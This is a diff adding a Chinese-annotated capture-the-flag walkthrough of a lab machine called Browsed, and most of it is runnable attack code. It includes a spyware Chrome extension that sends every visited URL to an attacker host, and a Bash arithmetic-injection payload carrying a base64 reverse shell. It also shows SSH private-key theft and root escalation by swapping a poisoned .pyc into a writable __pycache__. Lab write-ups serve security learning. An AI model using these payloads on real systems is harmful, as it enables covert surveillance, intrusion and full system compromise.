@@ -508,3 +508,274 @@ auctioneer@gavel:~$ cat /home/auctioneer/root.txt
 </details>
 
 ----------------------------------------------------------------------------------
+#### ' Chrome 扩展 Manifest v3' From Browsed
+<details>
+<summary>manifest.json 是一个 Chrome 扩展（Manifest V3）配置文件</summary>
+
+```
+____________________________________________________________________________
+//定义了扩展程序的元数据、权限和入口点
+//manifest.json 是一个 Chrome 扩展（Manifest V3）配置文件
+[★]$ vi manifest.json
+{
+		"manifest_version": 3,
+		"name": "Parallel Request Sender",	
+		"version": "1.0",
+		"description": "Spyer extension to log visited websites",	//记录用户访问的网站（浏览器监控）
+		"permissions": [
+				"declarativeNetRequest",				//可以拦截 HTTP/HTTPS 请求
+				"declarativeNetRequestWithHostAccess",	//可以修改请求
+				"storage",	//存储收集的数据（比如访问记录）;甚至缓存敏感信息
+				"tabs",		//获取当前打开的网页;读取 URL;监控用户行为
+				"webRequest"							//可以记录请求
+		],												//能看到用户访问的所有 URL（包括 cookie / token 相关请求）
+		"host_permissions": [
+				"<all_urls>"		//全站访问权限,可以访问所有网站（包括：银行 / 登录页 / 内网）
+		],
+		"background": {
+				"service_worker": "background.js"	
+		}
+}
+____________________________________________________________________________
+```
+</details>
+
+<details>
+<summary>background.js 是后台运行以处理事件和执行操作的逻辑</summary>
+
+```
+____________________________________________________________________________
+//后台运行以处理事件和执行操作的逻辑
+[★]$ vi background.js
+chrome.webRequest.onBeforeRequest.addListener(		//监听所有网页请求（在请求发出前）
+		function (details) {
+				if (!details.url.includes("http://10.10.15.139")) {		//避免“自己发的请求”再次被监听（防死循环）
+						fetch("http://10.10.15.139:4444", {				//把数据发到攻击者机器
+								method: "POST",
+								headers: {
+										"Content-Type": "application/json",
+								},
+								body: JSON.stringify({
+										originalUrl: details.url,				//用户访问的 URL
+										timestamp: new Date().toISOString(),	//时间
+								}),
+								mode: 'no-cors',
+						})
+				}
+		},
+		{ urls: ["<all_urls>"] }		//作用范围：所有网站
+);"] }
+);
+____________________________________________________________________________
+```
+</details>
+
+```
+[★]$ zip addon.zip manifest.json background.js
+```
+<details>
+<summary>Node.js HTTP 监听服务器</summary>
+	
+```
+____________________________________________________________________________
+//一个简单的 JavaScript 服务器;Node.js HTTP 监听服务器
+[★]$ vi server.js
+const http = require('http');
+http.createServer((req, res) => {	//开一个 Web 服务（端口 4444）
+		let body = '';
+		req.on('data', chunk => body += chunk);		//接收请求数据（POST body）
+		req.on('end', () => {
+				console.log(`\n--- ${req.method} ${req.url} ---\n${JSON.stringify(req.headers, null, 2)}\nBody:\n${body}`);
+				res.writeHead(200, { 'Content-Type': 'text/plain' });
+				res.end('OK\n');			//返回 OK（无任何处理）
+		});
+}).listen(4444, () => console.log('Server listening on port 4444'));
+____________________________________________________________________________
+//console.log(`								// 打印：
+--- ${req.method} ${req.url} ---			//请求方法（GET / POST）
+${JSON.stringify(req.headers, null, 2)}		//请求路径:请求头（headers）;请求体（body）
+Body:
+${body}`);
+____________________________________________________________________________
+//启动服务器以捕获 HTTP 请求
+[★]$ node server.js
+Server listening on port 4444
+
+--- POST / ---
+{
+  "host": "10.10.15.139:4444",
+  "connection": "keep-alive",
+  "content-length": "104",
+  "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36",
+  "content-type": "text/plain;charset=UTF-8",
+  "accept": "*/*",
+  "origin": "chrome-extension://ofpjodhgdkndahokbggjcoadhkfnlhjc",
+  "accept-encoding": "gzip, deflate",
+  "accept-language": "en-US,en;q=0.9"
+}
+Body:
+{"originalUrl":"http://browsedinternals.htb/assets/img/logo.svg","timestamp":"2026-04-06T09:09:55.442Z"}
+<SNIP>
+____________________________________________________________________________
+```
+</details>
+
+<details>
+<summary>if [[ "$1" -eq 0 ]]; then </summary>
+	
+```
+____________________________________________________________________________
+[★]$ cat app.py
+
+    subprocess.run(["./routines.sh", rid])		//它的指向 x[$()]
+____________________________________________________________________________
+[★]$ cat routines.sh	//漏洞点：-eq 会让 Bash 把 $1 当“表达式”解析，而不是普通字符串
+
+if [[ "$1" -eq 0 ]]; then 
+____________________________________________________________________________
+[★]$ echo -n "bash -i >& /dev/tcp/10.10.15.139/9011 0>&1" | base64
+YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMzkvOTAxMSAwPiYx
+____________________________________________________________________________
+//x[$()]
+//目标机器本地有一个 Web 服务在 5000 端口
+
+[★]$ cat background.js
+function onExtensionLoaded() {
+		fetch('http://127.0.0.1:5000/routines/x[$(echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS4xMzkvOTAxMSAwPiYx | base64 -d | bash)]')
+}
+onExtensionLoaded();
+____________________________________________________________________________
+[★]$ zip pwn.zip manifest.json background.js
+____________________________________________________________________________
+```
+</details>
+
+<details>
+<summary>很简单的rsa,不需要密码，也不需要公钥 </summary>
+	
+```
+____________________________________________________________________________
+[★]$ nc -lvnp 9011
+
+larry@browsed:~/.ssh$ ls -la ~/.ssh
+ls -la ~/.ssh
+total 20
+drwx------ 2 larry larry 4096 Jan  6 10:28 .
+drwxr-x--- 9 larry larry 4096 Jan  6 11:11 ..
+-rw------- 1 larry larry   95 Aug 17  2025 authorized_keys
+-rw------- 1 larry larry  399 Aug 17  2025 id_ed25519
+-rw-r--r-- 1 larry larry   95 Aug 17  2025 id_ed25519.pub
+larry@browsed:~/.ssh$ cat id_ed25519
+//很简单的rsa,不需要密码，也不需要公钥
+[★]$ cat id_larry.rsa
+[★]$ chmod 600 id_larry.rsa
+[★]$ ssh -i id_larry.rsa larry@10.129.244.79
+larry@browsed:~$
+____________________________________________________________________________
+```
+</details>
+
+
+<details>
+<summary>.pyc的编译：$ python3 -m py_compile extension_utils.py </summary>
+	
+```
+larry@browsed:~$ sudo -l
+Matching Defaults entries for larry on browsed:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User larry may run the following commands on browsed:
+    (root) NOPASSWD: /opt/extensiontool/extension_tool.py
+
+larry@browsed:/opt/extensiontool$ sudo /opt/extensiontool/extension_tool.py			----
+[X] Use one of the following extensions : ['Fontify', 'Timer', 'ReplaceImages']			|
+____________________________________________________________________________			|
+larry@browsed:/opt/extensiontool$ ls -la												|
+drwxrwxr-x 5 root root 4096 Mar 23  2025 extensions										|
+-rwxrwxr-x 1 root root 2739 Mar 27  2025 extension_tool.py								|
+-rw-rw-r-- 1 root root 1245 Mar 23  2025 extension_utils.py		---						|
+drwxrwxrwx 2 root root 4096 Dec 11 07:57 __pycache__			   |					|		
+																   | $ python3 -m py_compile extension_utils.py
+larry@browsed:/opt/extensiontool$ ls -la __pycache__/			   V					|
+-rw-r--r-- 1 root root 1880 Apr  6 10:16 extension_utils.cpython-312.pyc	<-----------
+____________________________________________________________________________
+没有对原始文件的写入权限，但对目录__pycache__有写入权限
+
+//查看 extension_utils.py 文件，从中可以看到它定义了两个主要函数：validate_manifest() 和 clean_temp_files()
+____________________________________________________________________________
+// extension_utils.py --> evil_module.py
+
+larry@browsed:/tmp$ vi evil_module.py
+larry@browsed:/tmp$ cat evil_module.py
+def validate_manifest(path):
+	import os
+	os.system("/bin/bash")
+
+def clean_temp_files(path):
+	import os 
+	os.system("bash -i >& /dev/tcp/10.10.15.139/9011 0>&1")
+____________________________________________________________________________
+//编译此文件来生成一个 .pyc 文件。
+larry@browsed:/tmp$ python3 -m py_compile /tmp/evil_module.py
+larry@browsed:/tmp$ ls -la __pycache__
+
+-rw-rw-r--  1 larry larry  466 Apr  6 11:02 evil_module.cpython-312.pyc
+____________________________________________________________________________
+```
+</details>
+
+<details>
+<summary>对目录__pycache__的写入 </summary>
+	
+```
+____________________________________________________________________________
+larry@browsed:/tmp$ vi create_header.py
+def transplant_header(good_pyc, evil_pyc, output_pyc):
+	with open(good_pyc, 'rb') as f:
+		good_header = f.read(16)
+
+	with open(evil_pyc, 'rb') as f:
+		evil_data = f.read()
+
+	new_pyc = good_header + evil_data[16:]
+	import os
+	os.system(f"rm {output_pyc}")
+	with open(output_pyc, 'wb') as f:
+		f.write(new_pyc)
+
+	print(f"[+] Transplanted header from {good_pyc} into {evil_pyc}, saved as {output_pyc}")
+
+transplant_header(
+	'/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc',
+	'/tmp/__pycache__/evil_module.cpython-312.pyc',
+	'/opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc'
+)
+____________________________________________________________________________
+```
+</details>
+
+<details>
+<summary>--ext 是 命令行参数名:扩展 / 插件 </summary>
+
+```
+____________________________________________________________________________
+//要先开侦听 
+[★]$ nc -lvnp 9011
+listening on [any] 9011 ...
+____________________________________________________________________________
+//运行
+larry@browsed:/tmp$ python3 create_header.py
+[+] Transplanted header from /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc into /tmp/__pycache__/evil_module.cpython-312.pyc, saved as /opt/extensiontool/__pycache__/extension_utils.cpython-312.pyc
+____________________________________________________________________________
+//--ext 是 命令行参数名，通常表示：extension（扩展 / 插件）
+
+larry@browsed:/tmp$ sudo  /opt/extensiontool/extension_tool.py --ext Fontify
+root@browsed:/tmp# id
+uid=0(root) gid=0(root) groups=0(root)
+____________________________________________________________________________
+```
+</details>
+
+----------------------------------------------------------------------------------
